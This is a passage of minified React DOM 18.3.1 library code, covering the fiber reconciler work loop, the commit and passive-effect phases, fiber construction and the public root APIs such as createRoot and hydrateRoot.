}
function $o() {
  (ve = qt.current), V(qt);
}
function Nt(e, t) {
  (e.finishedWork = null), (e.finishedLanes = 0);
  var n = e.timeoutHandle;
  if ((n !== -1 && ((e.timeoutHandle = -1), Cp(n)), G !== null))
    for (n = G.return; n !== null; ) {
      var r = n;
      switch ((zo(r), r.tag)) {
        case 1:
          (r = r.type.childContextTypes), r != null && _r();
          break;
        case 3:
          un(), V(Ae), V(oe), Ko();
          break;
        case 5:
          Do(r);
          break;
        case 4:
          un();
          break;
        case 13:
          V(D);
          break;
        case 19:
          V(D);
          break;
        case 10:
          Fo(r.type._context);
          break;
        case 22:
        case 23:
          $o();
      }
      n = n.return;
    }
  if (
    ((_ = e),
    (G = e = At(e.current, null)),
    (te = ve = t),
    (Y = 0),
    (nr = null),
    (Zo = Pl = It = 0),
    (de = Fn = null),
    Ct !== null)
  ) {
    for (t = 0; t < Ct.length; t++)
      if (((n = Ct[t]), (r = n.interleaved), r !== null)) {
        n.interleaved = null;
        var l = r.next,
          i = n.pending;
        if (i !== null) {
          var o = i.next;
          (i.next = l), (r.next = o);
        }
        n.pending = r;
      }
    Ct = null;
  }
  return e;
}
function Xc(e, t) {
  do {
    var n = G;
    try {
      if ((Mo(), (Or.current = ul), ol)) {
        for (var r = K.memoizedState; r !== null; ) {
          var l = r.queue;
          l !== null && (l.pending = null), (r = r.next);
        }
        ol = !1;
      }
      if (
        ((Ut = 0),
        (b = q = K = null),
        (On = !1),
        ($n = 0),
        (Yo.current = null),
        n === null || n.return === null)
      ) {
        (Y = 1), (nr = t), (G = null);
        break;
      }
      e: {
        var i = e,
          o = n.return,
          u = n,
          s = t;
        if (
          ((t = te),
          (u.flags |= 32768),
          s !== null && typeof s == "object" && typeof s.then == "function")
        ) {
          var a = s,
            p = u,
            d = p.tag;
          if (!(p.mode & 1) && (d === 0 || d === 11 || d === 15)) {
            var h = p.alternate;
            h
              ? ((p.updateQueue = h.updateQueue),
                (p.memoizedState = h.memoizedState),
                (p.lanes = h.lanes))
              : ((p.updateQueue = null), (p.memoizedState = null));
          }
          var g = ls(o);
          if (g !== null) {
            (g.flags &= -257),
              is(g, o, u, i, t),
              g.mode & 1 && rs(i, a, t),
              (t = g),
              (s = a);
            var v = t.updateQueue;
            if (v === null) {
              var w = new Set();
              w.add(s), (t.updateQueue = w);
            } else v.add(s);
            break e;
          } else {
            if (!(t & 1)) {
              rs(i, a, t), eu();
              break e;
            }
            s = Error(x(426));
          }
        } else if (Q && u.mode & 1) {
          var S = ls(o);
          if (S !== null) {
            !(S.flags & 65536) && (S.flags |= 256),
              is(S, o, u, i, t),
              Ro(sn(s, u));
            break e;
          }
        }
        (i = s = sn(s, u)),
          Y !== 4 && (Y = 2),
          Fn === null ? (Fn = [i]) : Fn.push(i),
          (i = o);
        do {
          switch (i.tag) {
            case 3:
              (i.flags |= 65536), (t &= -t), (i.lanes |= t);
              var f = Nc(i, s, t);
              bu(i, f);
              break e;
            case 1:
              u = s;
              var c = i.type,
                A = i.stateNode;
              if (
                !(i.flags & 128) &&
                (typeof c.getDerivedStateFromError == "function" ||
                  (A !== null &&
                    typeof A.componentDidCatch == "function" &&
                    (dt === null || !dt.has(A))))
              ) {
                (i.flags |= 65536), (t &= -t), (i.lanes |= t);
                var y = jc(i, u, t);
                bu(i, y);
                break e;
              }
          }
          i = i.return;
        } while (i !== null);
      }
      Gc(n);
    } catch (k) {
      (t = k), G === n && n !== null && (G = n = n.return);
      continue;
    }
    break;
  } while (!0);
}
function Hc() {
  var e = sl.current;
  return (sl.current = ul), e === null ? ul : e;
}
function eu() {
  (Y === 0 || Y === 3 || Y === 2) && (Y = 4),
    _ === null || (!(It & 268435455) && !(Pl & 268435455)) || rt(_, te);
}
function fl(e, t) {
  var n = R;
  R |= 2;
  var r = Hc();
  (_ !== e || te !== t) && ((We = null), Nt(e, t));
  do
    try {
      Zp();
      break;
    } catch (l) {
      Xc(e, l);
    }
  while (!0);
  if ((Mo(), (R = n), (sl.current = r), G !== null)) throw Error(x(261));
  return (_ = null), (te = 0), Y;
}
function Zp() {
  for (; G !== null; ) Jc(G);
}
function bp() {
  for (; G !== null && !xd(); ) Jc(G);
}
function Jc(e) {
  var t = Yc(e.alternate, e, ve);
  (e.memoizedProps = e.pendingProps),
    t === null ? Gc(e) : (G = t),
    (Yo.current = null);
}
function Gc(e) {
  var t = e;
  do {
    var n = t.alternate;
    if (((e = t.return), t.flags & 32768)) {
      if (((n = Xp(n, t)), n !== null)) {
        (n.flags &= 32767), (G = n);
        return;
      }
      if (e !== null)
        (e.flags |= 32768), (e.subtreeFlags = 0), (e.deletions = null);
      else {
        (Y = 6), (G = null);
        return;
      }
    } else if (((n = Wp(n, t, ve)), n !== null)) {
      G = n;
      return;
    }
    if (((t = t.sibling), t !== null)) {
      G = t;
      return;
    }
    G = t = e;
  } while (t !== null);
  Y === 0 && (Y = 5);
}
function Et(e, t, n) {
  var r = O,
    l = Ne.transition;
  try {
    (Ne.transition = null), (O = 1), _p(e, t, n, r);
  } finally {
    (Ne.transition = l), (O = r);
  }
  return null;
}
function _p(e, t, n, r) {
  do en();
  while (it !== null);
  if (R & 6) throw Error(x(327));
  n = e.finishedWork;
  var l = e.finishedLanes;
  if (n === null) return null;
  if (((e.finishedWork = null), (e.finishedLanes = 0), n === e.current))
    throw Error(x(177));
  (e.callbackNode = null), (e.callbackPriority = 0);
  var i = n.lanes | n.childLanes;
  if (
    (Id(e, i),
    e === _ && ((G = _ = null), (te = 0)),
    (!(n.subtreeFlags & 2064) && !(n.flags & 2064)) ||
      Nr ||
      ((Nr = !0),
      Zc(Jr, function () {
        return en(), null;
      })),
    (i = (n.flags & 15990) !== 0),
    n.subtreeFlags & 15990 || i)
  ) {
    (i = Ne.transition), (Ne.transition = null);
    var o = O;
    O = 1;
    var u = R;
    (R |= 4),
      (Yo.current = null),
      Jp(e, n),
      Dc(n, e),
      vp(Oi),
      (qr = !!Ri),
      (Oi = Ri = null),
      (e.current = n),
      Gp(n),
      Ed(),
      (R = u),
      (O = o),
      (Ne.transition = i);
  } else e.current = n;
  if (
    (Nr && ((Nr = !1), (it = e), (cl = l)),
    (i = e.pendingLanes),
    i === 0 && (dt = null),
    Pd(n.stateNode),
    me(e, J()),
    t !== null)
  )
    for (r = e.onRecoverableError, n = 0; n < t.length; n++)
      (l = t[n]), r(l.value, { componentStack: l.stack, digest: l.digest });
  if (al) throw ((al = !1), (e = to), (to = null), e);
  return (
    cl & 1 && e.tag !== 0 && en(),
    (i = e.pendingLanes),
    i & 1 ? (e === no ? Bn++ : ((Bn = 0), (no = e))) : (Bn = 0),
    yt(),
    null
  );
}
function en() {
  if (it !== null) {
    var e = Na(cl),
      t = Ne.transition,
      n = O;
    try {
      if (((Ne.transition = null), (O = 16 > e ? 16 : e), it === null))
        var r = !1;
      else {
        if (((e = it), (it = null), (cl = 0), R & 6)) throw Error(x(331));
        var l = R;
        for (R |= 4, P = e.current; P !== null; ) {
          var i = P,
            o = i.child;
          if (P.flags & 16) {
            var u = i.deletions;
            if (u !== null) {
              for (var s = 0; s < u.length; s++) {
                var a = u[s];
                for (P = a; P !== null; ) {
                  var p = P;
                  switch (p.tag) {
                    case 0:
                    case 11:
                    case 15:
                      Mn(8, p, i);
                  }
                  var d = p.child;
                  if (d !== null) (d.return = p), (P = d);
                  else
                    for (; P !== null; ) {
                      p = P;
                      var h = p.sibling,
                        g = p.return;
                      if ((Bc(p), p === a)) {
                        P = null;
                        break;
                      }
                      if (h !== null) {
                        (h.return = g), (P = h);
                        break;
                      }
                      P = g;
                    }
                }
              }
              var v = i.alternate;
              if (v !== null) {
                var w = v.child;
                if (w !== null) {
                  v.child = null;
                  do {
                    var S = w.sibling;
                    (w.sibling = null), (w = S);
                  } while (w !== null);
                }
              }
              P = i;
            }
          }
          if (i.subtreeFlags & 2064 && o !== null) (o.return = i), (P = o);
          else
            e: for (; P !== null; ) {
              if (((i = P), i.flags & 2048))
                switch (i.tag) {
                  case 0:
                  case 11:
                  case 15:
                    Mn(9, i, i.return);
                }
              var f = i.sibling;
              if (f !== null) {
                (f.return = i.return), (P = f);
                break e;
              }
              P = i.return;
            }
        }
        var c = e.current;
        for (P = c; P !== null; ) {
          o = P;
          var A = o.child;
          if (o.subtreeFlags & 2064 && A !== null) (A.return = o), (P = A);
          else
            e: for (o = c; P !== null; ) {
              if (((u = P), u.flags & 2048))
                try {
                  switch (u.tag) {
                    case 0:
                    case 11:
                    case 15:
                      Cl(9, u);
                  }
                } catch (k) {
                  X(u, u.return, k);
                }
              if (u === o) {
                P = null;
                break e;
              }
              var y = u.sibling;
              if (y !== null) {
                (y.return = u.return), (P = y);
                break e;
              }
              P = u.return;
            }
        }
        if (
          ((R = l), yt(), De && typeof De.onPostCommitFiberRoot == "function")
        )
          try {
            De.onPostCommitFiberRoot(gl, e);
          } catch {}
        r = !0;
      }
      return r;
    } finally {
      (O = n), (Ne.transition = t);
    }
  }
  return !1;
}
function vs(e, t, n) {
  (t = sn(n, t)),
    (t = Nc(e, t, 1)),
    (e = ft(e, t, 1)),
    (t = se()),
    e !== null && (ir(e, 1, t), me(e, t));
}
function X(e, t, n) {
  if (e.tag === 3) vs(e, e, n);
  else
    for (; t !== null; ) {
      if (t.tag === 3) {
        vs(t, e, n);
        break;
      } else if (t.tag === 1) {
        var r = t.stateNode;
        if (
          typeof t.type.getDerivedStateFromError == "function" ||
          (typeof r.componentDidCatch == "function" &&
            (dt === null || !dt.has(r)))
        ) {
          (e = sn(n, e)),
            (e = jc(t, e, 1)),
            (t = ft(t, e, 1)),
            (e = se()),
            t !== null && (ir(t, 1, e), me(t, e));
          break;
        }
      }
      t = t.return;
    }
}
function $p(e, t, n) {
  var r = e.pingCache;
  r !== null && r.delete(t),
    (t = se()),
    (e.pingedLanes |= e.suspendedLanes & n),
    _ === e &&
      (te & n) === n &&
      (Y === 4 || (Y === 3 && (te & 130023424) === te && 500 > J() - bo)
        ? Nt(e, 0)
        : (Zo |= n)),
    me(e, t);
}
function qc(e, t) {
  t === 0 &&
    (e.mode & 1
      ? ((t = gr), (gr <<= 1), !(gr & 130023424) && (gr = 4194304))
      : (t = 1));
  var n = se();
  (e = Ze(e, t)), e !== null && (ir(e, t, n), me(e, n));
}
function eA(e) {
  var t = e.memoizedState,
    n = 0;
  t !== null && (n = t.retryLane), qc(e, n);
}
function tA(e, t) {
  var n = 0;
  switch (e.tag) {
    case 13:
      var r = e.stateNode,
        l = e.memoizedState;
      l !== null && (n = l.retryLane);
      break;
    case 19:
      r = e.stateNode;
      break;
    default:
      throw Error(x(314));
  }
  r !== null && r.delete(t), qc(e, n);
}
var Yc;
Yc = function (e, t, n) {
  if (e !== null)
    if (e.memoizedProps !== t.pendingProps || Ae.current) pe = !0;
    else {
      if (!(e.lanes & n) && !(t.flags & 128)) return (pe = !1), Kp(e, t, n);
      pe = !!(e.flags & 131072);
    }
  else (pe = !1), Q && t.flags & 1048576 && $a(t, tl, t.index);
  switch (((t.lanes = 0), t.tag)) {
    case 2:
      var r = t.type;
      Fr(e, t), (e = t.pendingProps);
      var l = rn(t, oe.current);
      $t(t, n), (l = Xo(null, t, r, e, l, n));
      var i = Ho();
      return (
        (t.flags |= 1),
        typeof l == "object" &&
        l !== null &&
        typeof l.render == "function" &&
        l.$$typeof === void 0
          ? ((t.tag = 1),
            (t.memoizedState = null),
            (t.updateQueue = null),
            he(r) ? ((i = !0), $r(t)) : (i = !1),
            (t.memoizedState =
              l.state !== null && l.state !== void 0 ? l.state : null),
            Vo(t),
            (l.updater = kl),
            (t.stateNode = l),
            (l._reactInternals = t),
            Xi(t, r, e, n),
            (t = Gi(null, t, r, !0, i, n)))
          : ((t.tag = 0), Q && i && Io(t), ue(null, t, l, n), (t = t.child)),
        t
      );
    case 16:
      r = t.elementType;
      e: {
        switch (
          (Fr(e, t),
          (e = t.pendingProps),
          (l = r._init),
          (r = l(r._payload)),
          (t.type = r),
          (l = t.tag = rA(r)),
          (e = Ie(r, e)),
          l)
        ) {
          case 0:
            t = Ji(null, t, r, e, n);
            break e;
          case 1:
            t = ss(null, t, r, e, n);
            break e;
          case 11:
            t = os(null, t, r, e, n);
            break e;
          case 14:
            t = us(null, t, r, Ie(r.type, e), n);
            break e;
        }
        throw Error(x(306, r, ""));
      }
      return t;
    case 0:
      return (
        (r = t.type),
        (l = t.pendingProps),
        (l = t.elementType === r ? l : Ie(r, l)),
        Ji(e, t, r, l, n)
      );
    case 1:
      return (
        (r = t.type),
        (l = t.pendingProps),
        (l = t.elementType === r ? l : Ie(r, l)),
        ss(e, t, r, l, n)
      );
    case 3:
      e: {
        if ((Ic(t), e === null)) throw Error(x(387));
        (r = t.pendingProps),
          (i = t.memoizedState),
          (l = i.element),
          ic(e, t),
          ll(t, r, null, n);
        var o = t.memoizedState;
        if (((r = o.element), i.isDehydrated))
          if (
            ((i = {
              element: r,
              isDehydrated: !1,
              cache: o.cache,
              pendingSuspenseBoundaries: o.pendingSuspenseBoundaries,
              transitions: o.transitions,
            }),
            (t.updateQueue.baseState = i),
            (t.memoizedState = i),
            t.flags & 256)
          ) {
            (l = sn(Error(x(423)), t)), (t = as(e, t, r, n, l));
            break e;
          } else if (r !== l) {
            (l = sn(Error(x(424)), t)), (t = as(e, t, r, n, l));
            break e;
          } else
            for (
              ye = ct(t.stateNode.containerInfo.firstChild),
                we = t,
                Q = !0,
                Re = null,
                n = rc(t, null, r, n),
                t.child = n;
              n;

            )
              (n.flags = (n.flags & -3) | 4096), (n = n.sibling);
        else {
          if ((ln(), r === l)) {
            t = be(e, t, n);
            break e;
          }
          ue(e, t, r, n);
        }
        t = t.child;
      }
      return t;
    case 5:
      return (
        oc(t),
        e === null && Di(t),
        (r = t.type),
        (l = t.pendingProps),
        (i = e !== null ? e.memoizedProps : null),
        (o = l.children),
        Mi(r, l) ? (o = null) : i !== null && Mi(r, i) && (t.flags |= 32),
        Uc(e, t),
        ue(e, t, o, n),
        t.child
      );
    case 6:
      return e === null && Di(t), null;
    case 13:
      return zc(e, t, n);
    case 4:
      return (
        Qo(t, t.stateNode.containerInfo),
        (r = t.pendingProps),
        e === null ? (t.child = on(t, null, r, n)) : ue(e, t, r, n),
        t.child
      );
    case 11:
      return (
        (r = t.type),
        (l = t.pendingProps),
        (l = t.elementType === r ? l : Ie(r, l)),
        os(e, t, r, l, n)
      );
    case 7:
      return ue(e, t, t.pendingProps, n), t.child;
    case 8:
      return ue(e, t, t.pendingProps.children, n), t.child;
    case 12:
      return ue(e, t, t.pendingProps.children, n), t.child;
    case 10:
      e: {
        if (
          ((r = t.type._context),
          (l = t.pendingProps),
          (i = t.memoizedProps),
          (o = l.value),
          F(nl, r._currentValue),
          (r._currentValue = o),
          i !== null)
        )
          if (Fe(i.value, o)) {
            if (i.children === l.children && !Ae.current) {
              t = be(e, t, n);
              break e;
            }
          } else
            for (i = t.child, i !== null && (i.return = t); i !== null; ) {
              var u = i.dependencies;
              if (u !== null) {
                o = i.child;
                for (var s = u.firstContext; s !== null; ) {
                  if (s.context === r) {
                    if (i.tag === 1) {
                      (s = Ge(-1, n & -n)), (s.tag = 2);
                      var a = i.updateQueue;
                      if (a !== null) {
                        a = a.shared;
                        var p = a.pending;
                        p === null
                          ? (s.next = s)
                          : ((s.next = p.next), (p.next = s)),
                          (a.pending = s);
                      }
                    }
                    (i.lanes |= n),
                      (s = i.alternate),
                      s !== null && (s.lanes |= n),
                      Ki(i.return, n, t),
                      (u.lanes |= n);
                    break;
                  }
                  s = s.next;
                }
              } else if (i.tag === 10) o = i.type === t.type ? null : i.child;
              else if (i.tag === 18) {
                if (((o = i.return), o === null)) throw Error(x(341));
                (o.lanes |= n),
                  (u = o.alternate),
                  u !== null && (u.lanes |= n),
                  Ki(o, n, t),
                  (o = i.sibling);
              } else o = i.child;
              if (o !== null) o.return = i;
              else
                for (o = i; o !== null; ) {
                  if (o === t) {
                    o = null;
                    break;
                  }
                  if (((i = o.sibling), i !== null)) {
                    (i.return = o.return), (o = i);
                    break;
                  }
                  o = o.return;
                }
              i = o;
            }
        ue(e, t, l.children, n), (t = t.child);
      }
      return t;
    case 9:
      return (
        (l = t.type),
        (r = t.pendingProps.children),
        $t(t, n),
        (l = je(l)),
        (r = r(l)),
        (t.flags |= 1),
        ue(e, t, r, n),
        t.child
      );
    case 14:
      return (
        (r = t.type),
        (l = Ie(r, t.pendingProps)),
        (l = Ie(r.type, l)),
        us(e, t, r, l, n)
      );
    case 15:
      return Tc(e, t, t.type, t.pendingProps, n);
    case 17:
      return (
        (r = t.type),
        (l = t.pendingProps),
        (l = t.elementType === r ? l : Ie(r, l)),
        Fr(e, t),
        (t.tag = 1),
        he(r) ? ((e = !0), $r(t)) : (e = !1),
        $t(t, n),
        Pc(t, r, l),
        Xi(t, r, l, n),
        Gi(null, t, r, !0, e, n)
      );
    case 19:
      return Rc(e, t, n);
    case 22:
      return Lc(e, t, n);
  }
  throw Error(x(156, t.tag));
};
function Zc(e, t) {
  return Ea(e, t);
}
function nA(e, t, n, r) {
  (this.tag = e),
    (this.key = n),
    (this.sibling =
      this.child =
      this.return =
      this.stateNode =
      this.type =
      this.elementType =
        null),
    (this.index = 0),
    (this.ref = null),
    (this.pendingProps = t),
    (this.dependencies =
      this.memoizedState =
      this.updateQueue =
      this.memoizedProps =
        null),
    (this.mode = r),
    (this.subtreeFlags = this.flags = 0),
    (this.deletions = null),
    (this.childLanes = this.lanes = 0),
    (this.alternate = null);
}
function Pe(e, t, n, r) {
  return new nA(e, t, n, r);
}
function tu(e) {
  return (e = e.prototype), !(!e || !e.isReactComponent);
}
function rA(e) {
  if (typeof e == "function") return tu(e) ? 1 : 0;
  if (e != null) {
    if (((e = e.$$typeof), e === wo)) return 11;
    if (e === So) return 14;
  }
  return 2;
}
function At(e, t) {
  var n = e.alternate;
  return (
    n === null
      ? ((n = Pe(e.tag, t, e.key, e.mode)),
        (n.elementType = e.elementType),
        (n.type = e.type),
        (n.stateNode = e.stateNode),
        (n.alternate = e),
        (e.alternate = n))
      : ((n.pendingProps = t),
        (n.type = e.type),
        (n.flags = 0),
        (n.subtreeFlags = 0),
        (n.deletions = null)),
    (n.flags = e.flags & 14680064),
    (n.childLanes = e.childLanes),
    (n.lanes = e.lanes),
    (n.child = e.child),
    (n.memoizedProps = e.memoizedProps),
    (n.memoizedState = e.memoizedState),
    (n.updateQueue = e.updateQueue),
    (t = e.dependencies),
    (n.dependencies =
      t === null ? null : { lanes: t.lanes, firstContext: t.firstContext }),
    (n.sibling = e.sibling),
    (n.index = e.index),
    (n.ref = e.ref),
    n
  );
}
function Qr(e, t, n, r, l, i) {
  var o = 2;
  if (((r = e), typeof e == "function")) tu(e) && (o = 1);
  else if (typeof e == "string") o = 5;
  else
    e: switch (e) {
      case Bt:
        return jt(n.children, l, i, t);
      case yo:
        (o = 8), (l |= 8);
        break;
      case Ai:
        return (
          (e = Pe(12, n, t, l | 2)), (e.elementType = Ai), (e.lanes = i), e
        );
      case hi:
        return (e = Pe(13, n, t, l)), (e.elementType = hi), (e.lanes = i), e;
      case mi:
        return (e = Pe(19, n, t, l)), (e.elementType = mi), (e.lanes = i), e;
      case oa:
        return Nl(n, l, i, t);
      default:
        if (typeof e == "object" && e !== null)
          switch (e.$$typeof) {
            case la:
              o = 10;
              break e;
            case ia:
              o = 9;
              break e;
            case wo:
              o = 11;
              break e;
            case So:
              o = 14;
              break e;
            case et:
              (o = 16), (r = null);
              break e;
          }
        throw Error(x(130, e == null ? e : typeof e, ""));
    }
  return (
    (t = Pe(o, n, t, l)), (t.elementType = e), (t.type = r), (t.lanes = i), t
  );
}
function jt(e, t, n, r) {
  return (e = Pe(7, e, r, t)), (e.lanes = n), e;
}
function Nl(e, t, n, r) {
  return (
    (e = Pe(22, e, r, t)),
    (e.elementType = oa),
    (e.lanes = n),
    (e.stateNode = { isHidden: !1 }),
    e
  );
}
function ai(e, t, n) {
  return (e = Pe(6, e, null, t)), (e.lanes = n), e;
}
function ci(e, t, n) {
  return (
    (t = Pe(4, e.children !== null ? e.children : [], e.key, t)),
    (t.lanes = n),
    (t.stateNode = {
      containerInfo: e.containerInfo,
      pendingChildren: null,
      implementation: e.implementation,
    }),
    t
  );
}
function lA(e, t, n, r, l) {
  (this.tag = t),
    (this.containerInfo = e),
    (this.finishedWork =
      this.pingCache =
      this.current =
      this.pendingChildren =
        null),
    (this.timeoutHandle = -1),
    (this.callbackNode = this.pendingContext = this.context = null),
    (this.callbackPriority = 0),
    (this.eventTimes = Xl(0)),
    (this.expirationTimes = Xl(-1)),
    (this.entangledLanes =
      this.finishedLanes =
      this.mutableReadLanes =
      this.expiredLanes =
      this.pingedLanes =
      this.suspendedLanes =
      this.pendingLanes =
        0),
    (this.entanglements = Xl(0)),
    (this.identifierPrefix = r),
    (this.onRecoverableError = l),
    (this.mutableSourceEagerHydrationData = null);
}
function nu(e, t, n, r, l, i, o, u, s) {
  return (
    (e = new lA(e, t, n, u, s)),
    t === 1 ? ((t = 1), i === !0 && (t |= 8)) : (t = 0),
    (i = Pe(3, null, null, t)),
    (e.current = i),
    (i.stateNode = e),
    (i.memoizedState = {
      element: r,
      isDehydrated: n,
      cache: null,
      transitions: null,
      pendingSuspenseBoundaries: null,
    }),
    Vo(i),
    e
  );
}
function iA(e, t, n) {
  var r = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
  return {
    $$typeof: Ft,
    key: r == null ? null : "" + r,
    children: e,
    containerInfo: t,
    implementation: n,
  };
}
function bc(e) {
  if (!e) return mt;
  e = e._reactInternals;
  e: {
    if (Ot(e) !== e || e.tag !== 1) throw Error(x(170));
    var t = e;
    do {
      switch (t.tag) {
        case 3:
          t = t.stateNode.context;
          break e;
        case 1:
          if (he(t.type)) {
            t = t.stateNode.__reactInternalMemoizedMergedChildContext;
            break e;
          }
      }
      t = t.return;
    } while (t !== null);
    throw Error(x(171));
  }
  if (e.tag === 1) {
    var n = e.type;
    if (he(n)) return ba(e, n, t);
  }
  return t;
}
function _c(e, t, n, r, l, i, o, u, s) {
  return (
    (e = nu(n, r, !0, e, l, i, o, u, s)),
    (e.context = bc(null)),
    (n = e.current),
    (r = se()),
    (l = pt(n)),
    (i = Ge(r, l)),
    (i.callback = t ?? null),
    ft(n, i, l),
    (e.current.lanes = l),
    ir(e, l, r),
    me(e, r),
    e
  );
}
function jl(e, t, n, r) {
  var l = t.current,
    i = se(),
    o = pt(l);
  return (
    (n = bc(n)),
    t.context === null ? (t.context = n) : (t.pendingContext = n),
    (t = Ge(i, o)),
    (t.payload = { element: e }),
    (r = r === void 0 ? null : r),
    r !== null && (t.callback = r),
    (e = ft(l, t, o)),
    e !== null && (Me(e, l, o, i), Rr(e, l, o)),
    o
  );
}
function dl(e) {
  if (((e = e.current), !e.child)) return null;
  switch (e.child.tag) {
    case 5:
      return e.child.stateNode;
    default:
      return e.child.stateNode;
  }
}
function ys(e, t) {
  if (((e = e.memoizedState), e !== null && e.dehydrated !== null)) {
    var n = e.retryLane;
    e.retryLane = n !== 0 && n < t ? n : t;
  }
}
function ru(e, t) {
  ys(e, t), (e = e.alternate) && ys(e, t);
}
function oA() {
  return null;
}
var $c =
  typeof reportError == "function"
    ? reportError
    : function (e) {
        console.error(e);
      };
function lu(e) {
  this._internalRoot = e;
}
Tl.prototype.render = lu.prototype.render = function (e) {
  var t = this._internalRoot;
  if (t === null) throw Error(x(409));
  jl(e, t, null, null);
};
Tl.prototype.unmount = lu.prototype.unmount = function () {
  var e = this._internalRoot;
  if (e !== null) {
    this._internalRoot = null;
    var t = e.containerInfo;
    zt(function () {
      jl(null, e, null, null);
    }),
      (t[Ye] = null);
  }
};
function Tl(e) {
  this._internalRoot = e;
}
Tl.prototype.unstable_scheduleHydration = function (e) {
  if (e) {
    var t = La();
    e = { blockedOn: null, target: e, priority: t };
    for (var n = 0; n < nt.length && t !== 0 && t < nt[n].priority; n++);
    nt.splice(n, 0, e), n === 0 && Ia(e);
  }
};
function iu(e) {
  return !(!e || (e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11));
}
function Ll(e) {
  return !(
    !e ||
    (e.nodeType !== 1 &&
      e.nodeType !== 9 &&
      e.nodeType !== 11 &&
      (e.nodeType !== 8 || e.nodeValue !== " react-mount-point-unstable "))
  );
}
function ws() {}
function uA(e, t, n, r, l) {
  if (l) {
    if (typeof r == "function") {
      var i = r;
      r = function () {
        var a = dl(o);
        i.call(a);
      };
    }
    var o = _c(t, r, e, 0, null, !1, !1, "", ws);
    return (
      (e._reactRootContainer = o),
      (e[Ye] = o.current),
      qn(e.nodeType === 8 ? e.parentNode : e),
      zt(),
      o
    );
  }
  for (; (l = e.lastChild); ) e.removeChild(l);
  if (typeof r == "function") {
    var u = r;
    r = function () {
      var a = dl(s);
      u.call(a);
    };
  }
  var s = nu(e, 0, !1, null, null, !1, !1, "", ws);
  return (
    (e._reactRootContainer = s),
    (e[Ye] = s.current),
    qn(e.nodeType === 8 ? e.parentNode : e),
    zt(function () {
      jl(t, s, n, r);
    }),
    s
  );
}
function Ul(e, t, n, r, l) {
  var i = n._reactRootContainer;
  if (i) {
    var o = i;
    if (typeof l == "function") {
      var u = l;
      l = function () {
        var s = dl(o);
        u.call(s);
      };
    }
    jl(t, o, e, l);
  } else o = uA(n, t, e, l, r);
  return dl(o);
}
ja = function (e) {
  switch (e.tag) {
    case 3:
      var t = e.stateNode;
      if (t.current.memoizedState.isDehydrated) {
        var n = jn(t.pendingLanes);
        n !== 0 &&
          (ko(t, n | 1), me(t, J()), !(R & 6) && ((an = J() + 500), yt()));
      }
      break;
    case 13:
      zt(function () {
        var r = Ze(e, 1);
        if (r !== null) {
          var l = se();
          Me(r, e, 1, l);
        }
      }),
        ru(e, 1);
  }
};
Co = function (e) {
  if (e.tag === 13) {
    var t = Ze(e, 134217728);
    if (t !== null) {
      var n = se();
      Me(t, e, 134217728, n);
    }
    ru(e, 134217728);
  }
};
Ta = function (e) {
  if (e.tag === 13) {
    var t = pt(e),
      n = Ze(e, t);
    if (n !== null) {
      var r = se();
      Me(n, e, t, r);
    }
    ru(e, t);
  }
};
La = function () {
  return O;
};
Ua = function (e, t) {
  var n = O;
  try {
    return (O = e), t();
  } finally {
    O = n;
  }
};
Pi = function (e, t, n) {
  switch (t) {
    case "input":
      if ((yi(e, n), (t = n.name), n.type === "radio" && t != null)) {
        for (n = e; n.parentNode; ) n = n.parentNode;
        for (
          n = n.querySelectorAll(
            "input[name=" + JSON.stringify("" + t) + '][type="radio"]'
          ),
            t = 0;
          t < n.length;
          t++
        ) {
          var r = n[t];
          if (r !== e && r.form === e.form) {
            var l = Sl(r);
            if (!l) throw Error(x(90));
            sa(r), yi(r, l);
          }
        }
      }
      break;
    case "textarea":
      ca(e, n);
      break;
    case "select":
      (t = n.value), t != null && Yt(e, !!n.multiple, t, !1);
  }
};
ga = _o;
va = zt;
var sA = { usingClientEntryPoint: !1, Events: [ur, Kt, Sl, ha, ma, _o] },
  En = {
    findFiberByHostInstance: kt,
    bundleType: 0,
    version: "18.3.1",
    rendererPackageName: "react-dom",
  },
  aA = {
    bundleType: En.bundleType,
    version: En.version,
    rendererPackageName: En.rendererPackageName,
    rendererConfig: En.rendererConfig,
    overrideHookState: null,
    overrideHookStateDeletePath: null,
    overrideHookStateRenamePath: null,
    overrideProps: null,
    overridePropsDeletePath: null,
    overridePropsRenamePath: null,
    setErrorHandler: null,
    setSuspenseHandler: null,
    scheduleUpdate: null,
    currentDispatcherRef: _e.ReactCurrentDispatcher,
    findHostInstanceByFiber: function (e) {
      return (e = Sa(e)), e === null ? null : e.stateNode;
    },
    findFiberByHostInstance: En.findFiberByHostInstance || oA,
    findHostInstancesForRefresh: null,
    scheduleRefresh: null,
    scheduleRoot: null,
    setRefreshHandler: null,
    getCurrentFiber: null,
    reconcilerVersion: "18.3.1-next-f1338f8080-20240426",
  };
if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
  var jr = __REACT_DEVTOOLS_GLOBAL_HOOK__;
  if (!jr.isDisabled && jr.supportsFiber)
    try {
      (gl = jr.inject(aA)), (De = jr);
    } catch {}
}
xe.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = sA;
xe.createPortal = function (e, t) {
  var n = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
  if (!iu(t)) throw Error(x(200));
  return iA(e, t, null, n);
};
xe.createRoot = function (e, t) {
  if (!iu(e)) throw Error(x(299));
  var n = !1,
    r = "",
    l = $c;
  return (
    t != null &&
      (t.unstable_strictMode === !0 && (n = !0),
      t.identifierPrefix !== void 0 && (r = t.identifierPrefix),
      t.onRecoverableError !== void 0 && (l = t.onRecoverableError)),
    (t = nu(e, 1, !1, null, null, n, !1, r, l)),
    (e[Ye] = t.current),
    qn(e.nodeType === 8 ? e.parentNode : e),
    new lu(t)
  );
};
xe.findDOMNode = function (e) {
  if (e == null) return null;
  if (e.nodeType === 1) return e;
  var t = e._reactInternals;
  if (t === void 0)
    throw typeof e.render == "function"
      ? Error(x(188))
      : ((e = Object.keys(e).join(",")), Error(x(268, e)));
  return (e = Sa(t)), (e = e === null ? null : e.stateNode), e;
};
xe.flushSync = function (e) {
  return zt(e);
};
xe.hydrate = function (e, t, n) {
  if (!Ll(t)) throw Error(x(200));
  return Ul(null, e, t, !0, n);
};
xe.hydrateRoot = function (e, t, n) {
  if (!iu(e)) throw Error(x(405));
  var r = (n != null && n.hydratedSources) || null,
    l = !1,
    i = "",
    o = $c;
  if (
    (n != null &&
      (n.unstable_strictMode === !0 && (l = !0),
      n.identifierPrefix !== void 0 && (i = n.identifierPrefix),
